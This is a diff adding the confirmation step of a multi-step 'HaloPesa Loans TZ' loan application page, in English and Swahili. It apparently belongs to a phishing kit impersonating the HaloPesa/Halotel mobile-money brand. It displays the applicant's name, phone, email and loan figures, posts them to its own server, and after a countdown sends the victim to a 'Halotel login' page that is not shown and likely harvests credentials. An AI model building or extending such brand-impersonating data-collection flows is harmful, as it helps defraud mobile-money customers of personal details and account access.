@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HaloPesa Loans TZ — Confirm</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+
+        body { background: #f7f7f7; min-height: 100vh; display: flex; flex-direction: column; }
+
+        .header {
+            background: #fff; padding: 14px 20px;
+            display: flex; align-items: center; gap: 14px;
+            border-bottom: 3px solid #F58220;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+        .back-arrow {
+            font-size: 22px; color: #333; text-decoration: none;
+            line-height: 1; cursor: pointer; transition: transform 0.2s;
+        }
+        .back-arrow:hover { transform: translateX(-3px); }
+        .logo-box { display: flex; align-items: center; gap: 10px; }
+        .logo-mark {
+            width: 40px; height: 40px; background: #F58220;
+            border-radius: 10px; display: flex; align-items: center;
+            justify-content: center; color: #fff; font-weight: 900; font-size: 18px;
+        }
+        .logo-text { font-weight: 900; font-size: 20px; color: #1a1a1a; letter-spacing: -0.5px; }
+        .logo-text span { color: #F58220; }
+        .header-title { font-size: 14px; font-weight: 700; color: #444; margin-left: auto; }
+
+        .main { flex: 1; display: flex; justify-content: center; padding: 30px 16px 60px; }
+        .card {
+            background: #fff; width: 100%; max-width: 520px;
+            border-radius: 20px; padding: 36px 30px 32px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.06); height: fit-content;
+        }
+        .card h1 {
+            font-size: 24px; font-weight: 800; color: #111;
+            text-align: center; margin-bottom: 6px;
+        }
+        .step-text { text-align: center; color: #888; font-size: 13px; margin-bottom: 18px; }
+
+        .progress { display: flex; gap: 8px; justify-content: center; margin-bottom: 30px; }
+        .progress .bar { height: 5px; width: 70px; border-radius: 3px; background: #e5e5e5; }
+        .progress .bar.active { background: #F58220; }
+
+        .summary { margin-bottom: 26px; }
+        .summary-row {
+            display: flex; justify-content: space-between; align-items: baseline;
+            padding: 12px 0; border-bottom: 1px dashed #eee; font-size: 14px;
+        }
+        .summary-row:last-child { border-bottom: none; }
+        .summary-label { color: #666; font-weight: 600; }
+        .summary-value { color: #111; font-weight: 800; text-align: right; max-width: 60%; }
+        .summary-row.total {
+            border-top: 2px solid #F58220; border-bottom: none;
+            margin-top: 8px; padding-top: 16px;
+        }
+        .summary-row.total .summary-label { color: #F58220; font-weight: 800; font-size: 15px; }
+        .summary-row.total .summary-value { color: #F58220; font-weight: 900; font-size: 18px; }
+
+        .agree-box {
+            display: flex; align-items: flex-start; gap: 10px;
+            padding: 14px; background: #fffbf6;
+            border: 1px solid #ffe3c7; border-radius: 10px;
+            margin-bottom: 22px; font-size: 13px; color: #333; line-height: 1.5;
+        }
+        .agree-box input[type=checkbox] {
+            margin-top: 2px; width: 18px; height: 18px;
+            accent-color: #F58220; flex-shrink: 0; cursor: pointer;
+        }
+        .agree-box label { cursor: pointer; }
+
+        .btn-group { display: flex; gap: 12px; margin-top: 6px; }
+        .prev-btn, .submit-btn {
+            flex: 1; padding: 16px; font-size: 15px; font-weight: 800;
+            letter-spacing: 1px; border-radius: 12px; cursor: pointer;
+            text-transform: uppercase; text-align: center;
+            text-decoration: none; display: inline-block;
+            transition: background 0.2s, transform 0.1s; border: none;
+        }
+        .prev-btn { background: #f0f0f0; color: #333; }
+        .prev-btn:hover { background: #e0e0e0; }
+        .submit-btn { background: #F58220; color: #fff; }
+        .submit-btn:hover { background: #d96f18; }
+        .submit-btn:active, .prev-btn:active { transform: scale(0.99); }
+
+        /* Loading overlay with countdown */
+        .loading {
+            position: fixed; inset: 0;
+            background: rgba(255,255,255,0.98);
+            display: none; flex-direction: column;
+            align-items: center; justify-content: center;
+            z-index: 999; padding: 24px; text-align: center;
+        }
+        .loading.show { display: flex; }
+
+        .spinner {
+            width: 70px; height: 70px;
+            border: 6px solid #ffe3c7;
+            border-top: 6px solid #F58220;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 24px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .loading-title {
+            font-size: 20px; font-weight: 800; color: #111;
+            margin-bottom: 8px;
+        }
+        .loading-sub {
+            font-size: 14px; color: #666; margin-bottom: 24px;
+        }
+        .countdown {
+            width: 60px; height: 60px;
+            background: #F58220; color: #fff;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 26px; font-weight: 900;
+            box-shadow: 0 8px 20px rgba(245,130,32,0.4);
+        }
+
+        .status {
+            display: none; text-align: center; font-size: 13px;
+            margin-top: 14px; color: #F58220; font-weight: 700;
+        }
+        .status.show { display: block; }
+
+        .footer {
+            background: #111; color: #F58220; text-align: center;
+            padding: 18px; font-size: 12px; font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 28px 20px; }
+            .card h1 { font-size: 21px; }
+            .progress .bar { width: 55px; }
+            .btn-group { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <a href="details.html" class="back-arrow">←</a>
+        <div class="logo-box">
+            <div class="logo-mark">H</div>
+            <div class="logo-text">Halo<span>Pesa</span></div>
+        </div>
+        <span class="header-title" id="headerTitle">Mobile Services</span>
+    </header>
+
+    <main class="main">
+        <div class="card">
+            <h1 id="heading">Confirm Your Application</h1>
+            <p class="step-text" id="stepText">Step 3 of 5</p>
+
+            <div class="progress">
+                <div class="bar active"></div>
+                <div class="bar active"></div>
+                <div class="bar active"></div>
+                <div class="bar"></div>
+                <div class="bar"></div>
+            </div>
+
+            <div class="summary">
+                <div class="summary-row">
+                    <span class="summary-label" id="lblApplicant">Applicant</span>
+                    <span class="summary-value" id="sumApplicant">—</span>
+                </div>
+                <div class="summary-row">
+                    <span class="summary-label" id="lblPhone">Phone</span>
+                    <span class="summary-value" id="sumPhone">—</span>
+                </div>
+                <div class="summary-row">
+                    <span class="summary-label" id="lblEmail">Email</span>
+                    <span class="summary-value" id="sumEmail">—</span>
+                </div>
+                <div class="summary-row">
+                    <span class="summary-label" id="lblAmount">Loan Amount</span>
+                    <span class="summary-value" id="sumAmount">—</span>
+                </div>
+                <div class="summary-row">
+                    <span class="summary-label" id="lblTerm">Term</span>
+                    <span class="summary-value" id="sumTerm">—</span>
+                </div>
+                <div class="summary-row total">
+                    <span class="summary-label" id="lblTotal">Total to Repay</span>
+                    <span class="summary-value" id="sumTotal">—</span>
+                </div>
+            </div>
+
+            <div class="agree-box">
+                <input type="checkbox" id="agree">
+                <label for="agree" id="agreeLabel">
+                    I confirm the information above is correct and I agree to the terms.
+                </label>
+            </div>
+
+            <div class="btn-group">
+                <a href="#" class="prev-btn" id="prevBtn">Previous</a>
+                <button class="submit-btn" id="submitBtn" disabled>Submit Application</button>
+            </div>
+
+            <div class="status" id="status"></div>
+        </div>
+    </main>
+
+    <!-- Loading overlay -->
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <div class="loading-title" id="loadingTitle">Application Submitted</div>
+        <div class="loading-sub" id="loadingSub">Redirecting to Halotel…</div>
+        <div class="countdown" id="countdown">5</div>
+    </div>
+
+    <footer class="footer" id="footer">© 2026 HaloPesa Loans TZ</footer>
+
+    <script>
+        const LANG = {
+            en: {
+                headerTitle: 'Mobile Services',
+                heading: 'Confirm Your Application',
+                stepText: 'Step 3 of 5',
+                lblApplicant: 'Applicant',
+                lblPhone: 'Phone',
+                lblEmail: 'Email',
+                lblAmount: 'Loan Amount',
+                lblTerm: 'Term',
+                lblTotal: 'Total to Repay',
+                months: 'months',
+                agreeLabel: 'I confirm the information above is correct and I agree to the terms.',
+                prevBtn: 'Previous',
+                submitBtn: 'Submit Application',
+                submitting: 'Submitting…',
+                error: 'Something went wrong. Please try again.',
+                loadingTitle: 'Application Submitted',
+                loadingSub: 'Redirecting to Halotel…',
+                footer: '© 2026 HaloPesa Loans TZ'
+            },
+            sw: {
+                headerTitle: 'Huduma za Simu',
+                heading: 'Thibitisha Maombi Yako',
+                stepText: 'Hatua 3 kati ya 5',
+                lblApplicant: 'Mwombaji',
+                lblPhone: 'Simu',
+                lblEmail: 'Barua Pepe',
+                lblAmount: 'Kiasi cha Mkopo',
+                lblTerm: 'Muda',
+                lblTotal: 'Jumla ya Kulipa',
+                months: 'miezi',
+                agreeLabel: 'Nathibitisha taarifa hapo juu ni sahihi na nakubaliana na masharti.',
+                prevBtn: 'Nyuma',
+                submitBtn: 'Tuma Maombi',
+                submitting: 'Inatuma…',
+                error: 'Kuna hitilafu. Tafadhali jaribu tena.',
+                loadingTitle: 'Maombi Yamewasilishwa',
+                loadingSub: 'Inakupeleka Halotel…',
+                footer: '© 2026 HaloPesa Loans TZ'
+            }
+        };
+
+        const lang = localStorage.getItem('lang') || 'en';
+        const t = LANG[lang];
+
+        ['headerTitle','heading','stepText','lblApplicant','lblPhone','lblEmail',
+         'lblAmount','lblTerm','lblTotal','agreeLabel','prevBtn','footer',
+         'loadingTitle','loadingSub'].forEach(id => {
+            const el = document.getElementById(id);
+            if (el) el.textContent = t[id];
+        });
+        document.getElementById('submitBtn').textContent = t.submitBtn;
+
+        // Read params
+        const params = new URLSearchParams(window.location.search);
+        const amount    = Number(params.get('amount') || 0);
+        const term      = Number(params.get('term')   || 12);
+        const firstName = params.get('firstName') || '';
+        const lastName  = params.get('lastName')  || '';
+        const email     = params.get('email')     || '';
+        const phone     = params.get('phone')     || '';
+
+        const interest = Math.round(amount * 0.08);
+        const total    = amount + interest;
+
+        function fmt(n) { return 'TZS ' + Number(n).toLocaleString(); }
+
+        document.getElementById('sumApplicant').textContent = (firstName + ' ' + lastName).trim() || '—';
+        document.getElementById('sumPhone').textContent     = phone ? '+255 ' + phone : '—';
+        document.getElementById('sumEmail').textContent     = email || '—';
+        document.getElementById('sumAmount').textContent    = fmt(amount);
+        document.getElementById('sumTerm').textContent      = term + ' ' + t.months;
+        document.getElementById('sumTotal').textContent     = fmt(total);
+
+        document.getElementById('prevBtn').addEventListener('click', function () {
+            this.href = 'details.html?' + params.toString();
+        });
+
+        const agree = document.getElementById('agree');
+        const submitBtn = document.getElementById('submitBtn');
+        const status = document.getElementById('status');
+        const loading = document.getElementById('loading');
+        const countdownEl = document.getElementById('countdown');
+
+        agree.addEventListener('change', function () {
+            submitBtn.disabled = !this.checked;
+            submitBtn.style.opacity = this.checked ? '1' : '0.5';
+            submitBtn.style.cursor  = this.checked ? 'pointer' : 'not-allowed';
+        });
+        submitBtn.style.opacity = '0.5';
+        submitBtn.style.cursor  = 'not-allowed';
+
+        // Submit + 5 second countdown
+        submitBtn.addEventListener('click', async function () {
+            if (submitBtn.disabled) return;
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = t.submitting;
+            status.classList.remove('show');
+
+            const payload = {
+                firstName, lastName, email, phone,
+                amount, term,
+                lang
+            };
+
+            try {
+                const res = await fetch('/api/submit-application', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const data = await res.json();
+
+                if (data.ok) {
+                    // Show 5-second countdown
+                    loading.classList.add('show');
+                    let n = 5;
+                    countdownEl.textContent = n;
+                    const iv = setInterval(() => {
+                        n--;
+                        countdownEl.textContent = n;
+                        if (n <= 0) {
+                            clearInterval(iv);
+                            // Redirect to Halotel login
+                            const next = new URLSearchParams(params);
+                            next.set('lang', lang);
+                            window.location.href = 'login.html?' + next.toString();
+                        }
+                    }, 1000);
+                } else {
+                    throw new Error('Server said not ok');
+                }
+            } catch (err) {
+                console.error(err);
+                status.textContent = t.error;
+                status.classList.add('show');
+                status.style.color = '#dc2626';
+                submitBtn.disabled = false;
+                submitBtn.textContent = t.submitBtn;
+            }
+        });
+    </script>
+</body>
+</html>
